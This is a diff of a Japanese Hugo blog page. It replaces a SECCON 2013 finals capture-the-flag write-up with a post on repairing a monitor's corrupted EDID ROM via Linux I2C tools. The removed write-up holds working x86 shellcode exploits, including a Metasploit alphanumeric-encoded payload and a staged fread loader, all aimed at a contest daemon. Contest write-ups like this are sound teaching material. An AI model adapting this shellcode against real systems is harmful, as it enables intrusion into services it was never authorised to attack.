@@ -8,266 +8,92 @@
 <meta name="generator" content="Hugo 0.42.2 with theme Tranquilpeak 0.4.3-SNAPSHOT">
 <meta name="author" content="Kazutoshi Noguchi">
 <meta name="keywords" content="">
-<meta name="description" content="結果
+<meta name="description" content="Acer H243HをDVIで接続すると認識しない。VGA接続とHDMI接続では正常に動作するが、DVIで接続するとsyslogに以下のエラーが出る。
+
+Jan  5 23:48:32 haramaki kernel: [97894.621687] amdgpu 0000:01:00.0: DVI-D-1: EDID is invalid:
+Jan  5 23:48:32 haramaki kernel: [97894.621694]         [00] BAD  00 ff ff ff ff ff ff 00 ff ff ff ff ff ff ff ff
+Jan  5 23:48:32 haramaki kernel: [97894.621696]         [00] BAD  2b 13 01 03 80 35 1d 78 ea 60 85 a6 56 4a 9c 25
+Jan  5 23:48:32 haramaki kernel: [97894.621697]         [00] BAD  12 50 54 af cf 00 81 80 71 4f 95 00 95 0f a9 40
+Jan  5 23:48:32 haramaki kernel: [97894.621698]         [00] BAD  b3 00 01 01 01 01 1a 36 80 a0 70 38 1f 40 30 20
+Jan  5 23:48:32 haramaki kernel: [97894.621699]         [00] BAD  35 00 13 2a 21 00 00 1a 00 00 00 fc 00 48 32 34
+Jan  5 23:48:32 haramaki kernel: [97894.621700]         [00] BAD  33 48 0a 20 20 20 20 20 20 20 00 00 00 fd 00 38
+Jan  5 23:48:32 haramaki kernel: [97894.621701]         [00] BAD  4c 1f 53 12 00 0a 20 20 20 20 20 20 00 00 00 ff
+Jan  5 23:48:32 haramaki kernel: [97894.621702]         [00] BAD  00 4c 45 57 30 43 30 31 34 34 30 31 31 0a 00 33
 
 
-
- 
-  
-  
-  
-  
-    
-  
-
-
-  
-    
-  
-    
-  
-    
-  
-   
-    スコアの推移
-  
-
-
-
-
-
- 
-  
-  
-  
-  
-    
-  
-
-
-  
-    
-  
-    
-  
-    
-  
-   
-    問題一覧
-  
-
-
-
-問題一覧の画像とCSSを保存し忘れた。 
-
-チーム0x0としてSECCON 2013 全国大会に参加しました。
-
-今回のメンバーはwasao, waidotto, nolzeと私です。
-4139ptで優勝しました。
+どうやらEDIDが壊れているようだ。
 
 ">
 
 
-<meta property="og:description" content="結果
+<meta property="og:description" content="Acer H243HをDVIで接続すると認識しない。VGA接続とHDMI接続では正常に動作するが、DVIで接続するとsyslogに以下のエラーが出る。
+
+Jan  5 23:48:32 haramaki kernel: [97894.621687] amdgpu 0000:01:00.0: DVI-D-1: EDID is invalid:
+Jan  5 23:48:32 haramaki kernel: [97894.621694]         [00] BAD  00 ff ff ff ff ff ff 00 ff ff ff ff ff ff ff ff
+Jan  5 23:48:32 haramaki kernel: [97894.621696]         [00] BAD  2b 13 01 03 80 35 1d 78 ea 60 85 a6 56 4a 9c 25
+Jan  5 23:48:32 haramaki kernel: [97894.621697]         [00] BAD  12 50 54 af cf 00 81 80 71 4f 95 00 95 0f a9 40
+Jan  5 23:48:32 haramaki kernel: [97894.621698]         [00] BAD  b3 00 01 01 01 01 1a 36 80 a0 70 38 1f 40 30 20
+Jan  5 23:48:32 haramaki kernel: [97894.621699]         [00] BAD  35 00 13 2a 21 00 00 1a 00 00 00 fc 00 48 32 34
+Jan  5 23:48:32 haramaki kernel: [97894.621700]         [00] BAD  33 48 0a 20 20 20 20 20 20 20 00 00 00 fd 00 38
+Jan  5 23:48:32 haramaki kernel: [97894.621701]         [00] BAD  4c 1f 53 12 00 0a 20 20 20 20 20 20 00 00 00 ff
+Jan  5 23:48:32 haramaki kernel: [97894.621702]         [00] BAD  00 4c 45 57 30 43 30 31 34 34 30 31 31 0a 00 33
 
 
-
- 
-  
-  
-  
-  
-    
-  
-
-
-  
-    
-  
-    
-  
-    
-  
-   
-    スコアの推移
-  
-
-
-
-
-
- 
-  
-  
-  
-  
-    
-  
-
-
-  
-    
-  
-    
-  
-    
-  
-   
-    問題一覧
-  
-
-
-
-問題一覧の画像とCSSを保存し忘れた。 
-
-チーム0x0としてSECCON 2013 全国大会に参加しました。
-
-今回のメンバーはwasao, waidotto, nolzeと私です。
-4139ptで優勝しました。
+どうやらEDIDが壊れているようだ。
 
 ">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SECCON 二連覇しました。(SECCON 2013 決勝 writeup)">
-<meta name="twitter:title" content="SECCON 二連覇しました。(SECCON 2013 決勝 writeup)">
-<meta property="og:url" content="https://ngkz.github.io/2014/03/seccon-2013-finals-writeup/">
-<meta property="twitter:url" content="https://ngkz.github.io/2014/03/seccon-2013-finals-writeup/">
+<meta property="og:title" content="EDIDが壊れて認識しないモニターの修理">
+<meta name="twitter:title" content="EDIDが壊れて認識しないモニターの修理">
+<meta property="og:url" content="https://ngkz.github.io/2019/01/edid-repair/">
+<meta property="twitter:url" content="https://ngkz.github.io/2019/01/edid-repair/">
 <meta property="og:site_name" content="ngkz.log">
-<meta property="og:description" content="結果
+<meta property="og:description" content="Acer H243HをDVIで接続すると認識しない。VGA接続とHDMI接続では正常に動作するが、DVIで接続するとsyslogに以下のエラーが出る。
+
+Jan  5 23:48:32 haramaki kernel: [97894.621687] amdgpu 0000:01:00.0: DVI-D-1: EDID is invalid:
+Jan  5 23:48:32 haramaki kernel: [97894.621694]         [00] BAD  00 ff ff ff ff ff ff 00 ff ff ff ff ff ff ff ff
+Jan  5 23:48:32 haramaki kernel: [97894.621696]         [00] BAD  2b 13 01 03 80 35 1d 78 ea 60 85 a6 56 4a 9c 25
+Jan  5 23:48:32 haramaki kernel: [97894.621697]         [00] BAD  12 50 54 af cf 00 81 80 71 4f 95 00 95 0f a9 40
+Jan  5 23:48:32 haramaki kernel: [97894.621698]         [00] BAD  b3 00 01 01 01 01 1a 36 80 a0 70 38 1f 40 30 20
+Jan  5 23:48:32 haramaki kernel: [97894.621699]         [00] BAD  35 00 13 2a 21 00 00 1a 00 00 00 fc 00 48 32 34
+Jan  5 23:48:32 haramaki kernel: [97894.621700]         [00] BAD  33 48 0a 20 20 20 20 20 20 20 00 00 00 fd 00 38
+Jan  5 23:48:32 haramaki kernel: [97894.621701]         [00] BAD  4c 1f 53 12 00 0a 20 20 20 20 20 20 00 00 00 ff
+Jan  5 23:48:32 haramaki kernel: [97894.621702]         [00] BAD  00 4c 45 57 30 43 30 31 34 34 30 31 31 0a 00 33
 
 
-
- 
-  
-  
-  
-  
-    
-  
-
-
-  
-    
-  
-    
-  
-    
-  
-   
-    スコアの推移
-  
-
-
-
-
-
- 
-  
-  
-  
-  
-    
-  
-
-
-  
-    
-  
-    
-  
-    
-  
-   
-    問題一覧
-  
-
-
-
-問題一覧の画像とCSSを保存し忘れた。 
-
-チーム0x0としてSECCON 2013 全国大会に参加しました。
-
-今回のメンバーはwasao, waidotto, nolzeと私です。
-4139ptで優勝しました。
+どうやらEDIDが壊れているようだ。
 
 ">
-<meta name="twitter:description" content="結果
+<meta name="twitter:description" content="Acer H243HをDVIで接続すると認識しない。VGA接続とHDMI接続では正常に動作するが、DVIで接続するとsyslogに以下のエラーが出る。
+
+Jan  5 23:48:32 haramaki kernel: [97894.621687] amdgpu 0000:01:00.0: DVI-D-1: EDID is invalid:
+Jan  5 23:48:32 haramaki kernel: [97894.621694]         [00] BAD  00 ff ff ff ff ff ff 00 ff ff ff ff ff ff ff ff
+Jan  5 23:48:32 haramaki kernel: [97894.621696]         [00] BAD  2b 13 01 03 80 35 1d 78 ea 60 85 a6 56 4a 9c 25
+Jan  5 23:48:32 haramaki kernel: [97894.621697]         [00] BAD  12 50 54 af cf 00 81 80 71 4f 95 00 95 0f a9 40
+Jan  5 23:48:32 haramaki kernel: [97894.621698]         [00] BAD  b3 00 01 01 01 01 1a 36 80 a0 70 38 1f 40 30 20
+Jan  5 23:48:32 haramaki kernel: [97894.621699]         [00] BAD  35 00 13 2a 21 00 00 1a 00 00 00 fc 00 48 32 34
+Jan  5 23:48:32 haramaki kernel: [97894.621700]         [00] BAD  33 48 0a 20 20 20 20 20 20 20 00 00 00 fd 00 38
+Jan  5 23:48:32 haramaki kernel: [97894.621701]         [00] BAD  4c 1f 53 12 00 0a 20 20 20 20 20 20 00 00 00 ff
+Jan  5 23:48:32 haramaki kernel: [97894.621702]         [00] BAD  00 4c 45 57 30 43 30 31 34 34 30 31 31 0a 00 33
 
 
-
- 
-  
-  
-  
-  
-    
-  
-
-
-  
-    
-  
-    
-  
-    
-  
-   
-    スコアの推移
-  
-
-
-
-
-
- 
-  
-  
-  
-  
-    
-  
-
-
-  
-    
-  
-    
-  
-    
-  
-   
-    問題一覧
-  
-
-
-
-問題一覧の画像とCSSを保存し忘れた。 
-
-チーム0x0としてSECCON 2013 全国大会に参加しました。
-
-今回のメンバーはwasao, waidotto, nolzeと私です。
-4139ptで優勝しました。
+どうやらEDIDが壊れているようだ。
 
 ">
 <meta property="og:locale" content="ja">
 
   
-    <meta property="article:published_time" content="2014-03-04T06:45:08">
+    <meta property="article:published_time" content="2019-01-06T17:19:12">
   
   
-    <meta property="article:modified_time" content="2014-03-04T06:45:08">
+    <meta property="article:modified_time" content="2019-01-06T17:19:12">
   
-  
-  
-    
-      <meta property="article:section" content="CTF">
-    
-      <meta property="article:section" content="writeup">
-    
   
   
     
-      <meta property="article:tag" content="SECCON">
+      <meta property="article:section" content="howto">
     
+  
   
 
 
@@ -287,14 +113,14 @@
   <meta property="twitter:image" content="https://ngkz.github.io/mypicture.jpg">
 
 
-    <title>SECCON 二連覇しました。(SECCON 2013 決勝 writeup)</title>
+    <title>EDIDが壊れて認識しないモニターの修理</title>
 
     <link rel="icon" href="https://ngkz.github.io/favicon.png">
     
 
     
 
-    <link rel="canonical" href="https://ngkz.github.io/2014/03/seccon-2013-finals-writeup/">
+    <link rel="canonical" href="https://ngkz.github.io/2019/01/edid-repair/">
 
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
@@ -444,19 +270,19 @@
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      SECCON 二連覇しました。(SECCON 2013 決勝 writeup)
+      EDIDが壊れて認識しないモニターの修理
     </h1>
   
   
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2014-03-04T06:45:08&#43;09:00">
+      <time itemprop="datePublished" datetime="2019-01-06T17:19:12&#43;09:00">
         
   
   
   
   
-    2014-03-04
+    2019-01-06
   
 
       </time>
@@ -466,9 +292,7 @@
   
     <span>カテゴリー</span>
     
-      <a class="category-link" href="https://ngkz.github.io/categories/ctf">CTF</a>, 
-    
-      <a class="category-link" href="https://ngkz.github.io/categories/writeup">writeup</a>
+      <a class="category-link" href="https://ngkz.github.io/categories/howto">howto</a>
     
   
 
@@ -478,535 +302,207 @@
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <h2 id="結果">結果</h2>
+              <p>Acer H243HをDVIで接続すると認識しない。VGA接続とHDMI接続では正常に動作するが、DVIで接続するとsyslogに以下のエラーが出る。</p>
 
+<pre><code>Jan  5 23:48:32 haramaki kernel: [97894.621687] amdgpu 0000:01:00.0: DVI-D-1: EDID is invalid:
+Jan  5 23:48:32 haramaki kernel: [97894.621694]         [00] BAD  00 ff ff ff ff ff ff 00 ff ff ff ff ff ff ff ff
+Jan  5 23:48:32 haramaki kernel: [97894.621696]         [00] BAD  2b 13 01 03 80 35 1d 78 ea 60 85 a6 56 4a 9c 25
+Jan  5 23:48:32 haramaki kernel: [97894.621697]         [00] BAD  12 50 54 af cf 00 81 80 71 4f 95 00 95 0f a9 40
+Jan  5 23:48:32 haramaki kernel: [97894.621698]         [00] BAD  b3 00 01 01 01 01 1a 36 80 a0 70 38 1f 40 30 20
+Jan  5 23:48:32 haramaki kernel: [97894.621699]         [00] BAD  35 00 13 2a 21 00 00 1a 00 00 00 fc 00 48 32 34
+Jan  5 23:48:32 haramaki kernel: [97894.621700]         [00] BAD  33 48 0a 20 20 20 20 20 20 20 00 00 00 fd 00 38
+Jan  5 23:48:32 haramaki kernel: [97894.621701]         [00] BAD  4c 1f 53 12 00 0a 20 20 20 20 20 20 00 00 00 ff
+Jan  5 23:48:32 haramaki kernel: [97894.621702]         [00] BAD  00 4c 45 57 30 43 30 31 34 34 30 31 31 0a 00 33
+</code></pre>
 
-
- 
-  
-  
-  
-  
-    
-  
-
-<div class="figure " >
-  
-    <a class="fancybox" href="https://ngkz.github.io/assets/seccon-2013-finals-writeup/seccon2013-score-mod.jpg" title="スコアの推移" data-fancybox-group="">
-  
-    <img class="fig-img" src="https://ngkz.github.io/assets/seccon-2013-finals-writeup/seccon2013-score-mod.jpg"  alt="スコアの推移">
-  
-    </a>
-  
-   
-    <span class="caption">スコアの推移</span>
-  
-</div>
-
-
-
-
- 
-  
-  
-  
-  
-    
-  
-
-<div class="figure " >
-  
-    <a class="fancybox" href="https://ngkz.github.io/assets/seccon-2013-finals-writeup/07a99802f28b64656dd4f4187644d1d8.png" title="問題一覧" data-fancybox-group="">
-  
-    <img class="fig-img" src="https://ngkz.github.io/assets/seccon-2013-finals-writeup/07a99802f28b64656dd4f4187644d1d8.png"  alt="問題一覧">
-  
-    </a>
-  
-   
-    <span class="caption">問題一覧</span>
-  
-</div>
-
-
-<p>問題一覧の画像とCSSを保存し忘れた。 </p>
-
-<p>チーム0x0としてSECCON 2013 全国大会に参加しました。</p>
-
-<p>今回のメンバーはwasao, waidotto, nolzeと私です。<br />
-4139ptで優勝しました。</p>
+<p>どうやらEDIDが壊れているようだ。</p>
 
 <p></p>
 
-<h2 id="解いた問題">解いた問題</h2>
+<h2 id="linuxからモニターのedid-romを読み書きするには">LinuxからモニターのEDID ROMを読み書きするには</h2>
 
-<h3 id="2-kaku">2.kaku</h3>
+<p>モニターには <a href="http://read.pudn.com/downloads110/ebook/456020/E-EDID%20Standard.pdf">EDID(利用可能な解像度・リフレッシュレート・メーカー名・型番などの情報)</a>が格納されたROMが搭載されており、PCとVESA Display Data Channel(I2Cベースのバス)で接続されている。</p>
 
-<p>通天閣</p>
+<p>このROMはLinuxからI2Cデバイスとして認識されているので、I2Cバス操作用のツールでROMを読み書きすることができる。</p>
 
-<p>問題ページでデーモンのバイナリ・ソースコード・xinetdの設定ファイルを固めたzipと、デーモンのアドレスが公開されている。</p>
+<h2 id="dviのedid-romが繋っているバスを探す">DVIのEDID ROMが繋っているバスを探す</h2>
 
-<ol>
-<li>forkを無効にする</li>
-<li>権限を降格</li>
-<li>stdinからシェルコードのサイズとシェルコード本体を読み込む</li>
-<li>フィルタにひっかからないかチェック</li>
-<li>実行</li>
-</ol>
+<p>rootで<code>i2cdetect -l</code> を実行し、バスの一覧を出す</p>
 
-<p>するデーモンが動いている。</p>
+<pre><code># i2cdetect -l
+i2c-3	i2c       	AMDGPU DM i2c hw bus 2          	I2C adapter
+i2c-1	i2c       	dmdc                            	I2C adapter
+i2c-2	i2c       	AMDGPU DM i2c hw bus 1          	I2C adapter
+i2c-0	i2c       	AMDGPU DM i2c hw bus 0          	I2C adapter
+</code></pre>
 
-<p>ステージをクリアしキーワードを送信すると次のステージが現れる。</p>
+<p>出力からバス0,2,3がGPUのものであることが分かるが、どのポートのものであるかまでは分からないので総当たりでダンプする。
+rootで<code>i2cdump (バス番号) 0x50</code> を実行するとEDIDをダンプできる。</p>
 
-<h4 id="stage1">stage1</h4>
+<pre><code class="language-plain"># echo Y | i2cdump 0 0x50
+No size specified (using byte-data access)
+WARNING! This program can confuse your I2C bus, cause data loss and worse!
+I will probe file /dev/i2c-0, address 0x50, mode byte
+Continue? [Y/n] 
+     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f    0123456789abcdef
+00: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+10: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+20: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+30: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+40: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+50: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+60: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+70: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+80: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+90: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+a0: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+b0: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+c0: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+d0: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+e0: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
+f0: XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX XX    XXXXXXXXXXXXXXXX
 
-<p>制限なし。やるだけ</p>
+# echo Y | i2cdump 2 0x50
+No size specified (using byte-data access)
+WARNING! This program can confuse your I2C bus, cause data loss and worse!
+I will probe file /dev/i2c-2, address 0x50, mode byte
+Continue? [Y/n] 
+     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f    0123456789abcdef
+00: 00 ff ff ff ff ff ff 00 2a 59 00 28 00 00 00 00    ........*Y.(....
+10: 19 19 01 03 80 3e 22 78 ea 1e c5 ae 4f 34 b1 26    ?????&gt;&quot;x????O4?&amp;
+20: 0e 50 54 af cf 00 d1 00 d1 c0 b3 00 a9 c0 95 00    ?PT??.?.???.???.
+30: 81 81 81 00 71 40 04 74 00 30 f2 70 5a 80 30 20    ???.q@?t.0?pZ?0 
+40: 36 00 70 fe 31 00 00 1a 56 5e 00 a0 a0 a0 29 50    6.p?1..?V^.???)P
+50: 30 20 36 00 70 fe 31 00 00 1a 00 00 00 fd 00 1e    0 6.p?1..?...?.?
+60: a0 17 50 19 00 0a 20 20 20 20 20 20 00 00 00 fc    ??P?.?      ...?
+70: 00 55 48 44 20 48 44 4d 49 0a 20 20 20 20 01 63    .UHD HDMI?    ?c
+80: 02 03 43 f3 58 61 90 05 04 60 65 66 03 02 07 16    ??C?Xa???`ef????
+90: 01 1f 12 13 14 20 15 11 06 5d 5e 5f 62 23 09 07    ????? ???]^_b#??
+a0: 07 83 01 00 00 e3 05 03 01 e2 0f 71 6e 03 0c 00    ???..??????qn??.
+b0: 10 00 38 3d 20 00 80 01 02 03 04 67 d8 5d c4 01    ?.8= .?????g?]??
+c0: 78 c0 00 02 3a 80 18 71 38 2d 40 58 2c 45 00 13    x?.?:??q8-@X,E.?
+d0: 2b 21 00 00 1a 02 3a 80 d0 72 38 2d 40 30 20 45    +!..??:??r8-@0 E
+e0: 00 06 44 21 00 00 1a 01 1d 80 18 71 1c 16 20 58    .?D!..?????q?? X
+f0: 2c 25 00 06 44 21 00 00 9e 00 00 00 00 00 00 a0    ,%.?D!..?......?
 
-<p>exploit:</p>
+# echo Y | i2cdump 3 0x50
+No size specified (using byte-data access)
+WARNING! This program can confuse your I2C bus, cause data loss and worse!
+I will probe file /dev/i2c-3, address 0x50, mode byte
+Continue? [Y/n] 
+     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f    0123456789abcdef
+00:  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
+10:  2b 13 01 03 80 35 1d 78 ea 60 85 a6 56 4a 9c 25   +....5.x.`..VJ.%
+20:  12 50 54 af cf 00 81 80 71 4f 95 00 95 0f a9 40   .PT.....qO.....@
+30:  b3 00 01 01 01 01 1a 36 80 a0 70 38 1f 40 30 20   .......6..p8.@0 
+40:  35 00 13 2a 21 00 00 1a 00 00 00 fc 00 48 32 34   5..*!........H24
+50:  33 48 0a 20 20 20 20 20 20 20 00 00 00 fd 00 38   3H.       .....8
+60:  4c 1f 53 12 00 0a 20 20 20 20 20 20 00 00 00 ff   L.S...      ....
+70:  00 4c 45 57 30 43 30 31 34 34 30 31 31 0a 00 33   .LEW0C0144011..3
+80:  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
+90:  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
+a0:  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
+b0:  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
+c0:  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
+d0:  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
+e0:  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
+f0:  ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff   ................
+</code></pre>
 
-<pre><code>#!/usr/bin/python
-import pack
+<p>EDIDの内容から、このカードではバス番号2がHDMIのバスで、バス番号3がDVIポートのバスであることがわかる。</p>
+
+<h2 id="正常なedidを吸い出す">正常なEDIDを吸い出す</h2>
+
+<p>モニタを正常なポート(HDMI)で接続し、正常なEDIDを吸い出す</p>
+
+<pre><code class="language-plain"># echo Y | i2cdump 2 0x50 &gt; edid-h243h-hdmi.txt
+$ vim edid-h243h-hdmi.txt
+(マクロで余計なデータを取り除いてhex dumpに変換)
+$ xxd -r -p &lt; edid-h243h-hdmi.txt &gt; edid-h243h-hdmi.bin
+</code></pre>
+
+<h2 id="dviポートのedidの修復">DVIポートのEDIDの修復</h2>
+
+<p>モニタをDVIで接続し、正常なEDIDを書き込む</p>
+
+<pre><code class="language-plain">$ cat &lt;&lt;'EOS' &gt;edidwrite.py
+#!/usr/bin/python3
 import sys
+import os
 
-#cat keyword.txt
-buf =  &quot;&quot;
-buf += &quot;\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89&quot;
-buf += &quot;\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10&quot;
-buf += &quot;\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01&quot;
-buf += &quot;\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00&quot;
-buf += &quot;\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x6b\x65\x79\x77&quot;
-buf += &quot;\x6f\x72\x64\x2e\x74\x78\x74\x00&quot;
- 
-sys.stdout.write(pack.pl32(len(buf)))
-sys.stdout.flush()
-sys.stdout.write(buf)
+with open(sys.argv[2], &quot;rb&quot;) as f:
+    edid = f.read()
+
+for i, byt in enumerate(edid):
+    os.system(&quot;echo Y | i2cset %d 0x50 0x%02x 0x%02x b&quot; % (int(sys.argv[1]), i, byt))
+    os.system(&quot;sleep 0.1&quot;)
+EOS
+$ sudo python3 edidwrite.py 3 edid-h243h-hdmi.bin
 </code></pre>
 
-<h4 id="stage2">stage2</h4>
 
-<p>フィルターでシェルコードが 英数字で構成されているかチェックされる。</p>
 
-<p>metasploitのx86/alpha_mixed
-エンコーダでシェルコードを英数字に変換する。</p>
-
-<p>alpha_mixedエンコーダは
-シェルコードのアドレスが入ったレジスタを指定しないとシェルコードの全てが英数字にならない。</p>
-
-<p>シェルコードへのアドレスがEAXに残っているので、</p>
-
-<pre><code>msf&gt; set BufferRegister EAX
-msf&gt; generate -e x86/alpha_mixed
-</code></pre>
-
-<p>でシェルコードを生成する。</p>
-
-<p>exploit:</p>
-
-<pre><code>#!/usr/bin/python
-import pack
-import sys
-import time
- 
-#cat keyword.txt
-buf =  &quot;&quot;
-buf += &quot;\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49&quot;
-buf += &quot;\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30&quot;
-buf += &quot;\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42&quot;
-buf += &quot;\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49&quot;
-buf += &quot;\x58\x6b\x67\x46\x4c\x78\x75\x55\x37\x70\x67\x70\x73&quot;
-buf += &quot;\x30\x31\x4b\x56\x51\x4f\x39\x58\x4d\x4d\x50\x6b\x39&quot;
-buf += &quot;\x6a\x63\x6d\x68\x64\x43\x43\x30\x67\x70\x45\x50\x6b&quot;
-buf += &quot;\x39\x79\x77\x6b\x39\x38\x79\x4f\x4a\x35\x50\x66\x70&quot;
-buf += &quot;\x35\x50\x65\x50\x58\x4d\x4f\x70\x6f\x79\x4f\x32\x4e&quot;
-buf += &quot;\x58\x66\x64\x57\x70\x77\x70\x35\x50\x4d\x6b\x43\x31&quot;
-buf += &quot;\x73\x30\x63\x30\x45\x50\x78\x4d\x6d\x50\x58\x38\x33&quot;
-buf += &quot;\x31\x75\x50\x57\x70\x77\x70\x4d\x6b\x35\x50\x43\x30&quot;
-buf += &quot;\x47\x70\x53\x30\x68\x4d\x4b\x30\x79\x78\x69\x55\x6b&quot;
-buf += &quot;\x4f\x6b\x4f\x69\x6f\x62\x4b\x63\x55\x61\x69\x31\x67&quot;
-buf += &quot;\x52\x4f\x50\x72\x35\x34\x76\x4e\x44\x34\x31\x68\x63&quot;
-buf += &quot;\x44\x73\x30\x41\x41&quot;
-sys.stdout.write(pack.pl32(len(buf)))
-sys.stdout.flush()
-sys.stdout.write(buf)
-</code></pre>
-
-<h4 id="stage3">stage3</h4>
-
-<p>シェルコードがアセンブラ短歌のフォーマットになっているかチェックするようになる。</p>
-
-<pre><code>#include &lt;libdis.h&gt;
- 
-static const int phrase_lengths[] = {5, 7, 5, 7, 7};
-static const int phrase_num =
-    sizeof(phrase_lengths) / sizeof(phrase_lengths[0]);
- 
-int filter(size_t sz, char *ptr)
-{
-    int             retval = 0;
-    size_t          byte_pos;
-    int             phrase_pos;
-    int             boundary;
-    x86_insn_t      insn;
-    unsigned int    insn_len;
- 
-    x86_init(opt_none, NULL, NULL);
- 
-    // Tanka checker
-    byte_pos = 0;
-    phrase_pos = 0;
-    boundary = phrase_lengths[phrase_pos];
-    while(byte_pos &lt; sz &amp;&amp; phrase_pos &lt; phrase_num){
-        insn_len = x86_disasm(ptr, sz, 0, byte_pos, &amp;insn);
-        if(insn_len == 0){
-            retval = 1;
-            goto END;
-        }
-        byte_pos += insn_len;
-        if(byte_pos == boundary){
-            if(++phrase_pos &lt;= phrase_num - 1){
-                boundary += phrase_lengths[phrase_pos];
-            }else{
-                break;
-            }
-        }else if (byte_pos &gt; boundary){
-            retval = 1;
-            goto END;
-        }
-    }
-    if(byte_pos != sz || phrase_pos != phrase_num){
-        retval = 1;
-    }
- 
-END:
-    x86_cleanup();
- 
-    return retval;
-}
-</code></pre>
-
-<p>5命令でファイルを表示するのは難しいので、freadでシェルコードを末尾に追加する。</p>
-
-<p><a href="https://ngkz.github.io/2014/01/seccon-2013-online-quals-writeup/#hack-this-site-bin500">オンライン予選のbin500と同じように</a>
-プレフィックスを付けて命令長を調整した。</p>
-
-<p>stdin 変数は 0x08049184にあるが、 push dword
-[0x08049184]は6バイトになってしまう。esp+0x10にstdin変数の中身が残っているのでそれをpushする。</p>
-
-<p>終了後に 最大5命令しか使えないわけではなく 命令の途中が5, 7, 5, 7,
-7バイトに引っかかっていなければよいことに気づいた。</p>
-
-<p>stage1:</p>
-
-<pre><code>bits 32
-org 0x80491c0
- 
-;5
-db 0x2e
-push dword [esp+0x10] ;stdin
-;7
-db 0x2e,0x2e
-push 2048
-;5
-db 0x2e,0x2e,0x2e
-push 1
-;7
-db 0x2e,0x2e
-push stage2
-;7
-db 0x2e,0x2e
-call 0x08048780 ;fread
- 
-stage2:
-</code></pre>
-
-<p>exploit:</p>
-
-<pre><code>#!/usr/bin/python
-import pack
-import sys
- 
-#stage1
-buf = &quot;\x2e\xff\x74\x24\x10\x2e\x2e\x68\x00\x08\x00\x00\x2e\x2e\x2e\x6a\x01\x2e\x2e\x68\xdf\x91\x04\x08\x2e\x2e\xe8\xa1\xf5\xff\xff&quot;
-sys.stdout.write(pack.pl32(len(buf)))
-sys.stdout.write(buf)
- 
-#stage2
-#cat keyword.txt
-buf =  &quot;&quot;
-buf += &quot;\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89&quot;
-buf += &quot;\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10&quot;
-buf += &quot;\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01&quot;
-buf += &quot;\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00&quot;
-buf += &quot;\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x6b\x65\x79\x77&quot;
-buf += &quot;\x6f\x72\x64\x2e\x74\x78\x74\x00&quot;
-sys.stdout.write(buf)
-</code></pre>
-
-<h4 id="stage4">stage4</h4>
-
-<p>nabytes.binの中身(最大2バイト) の一部
-がシェルコードに含まれていないかチェックするようになる。</p>
-
-<p>nabytes.binの中身は空だった。</p>
-
-<p>flagword.txtに自チームのフラッグワードを書き込むことができる。</p>
-
-<p>終了後に作問者から
-nabytes.binに書き込んで他のチームを妨害できると教えてもらった。</p>
-
-<p>shellcode_stage1.asm:</p>
-
-<pre><code>bits 32
-org 0x804a340
- 
-;5
-db 0x2e
-push dword [esp+0x10] ;stdin
-;7
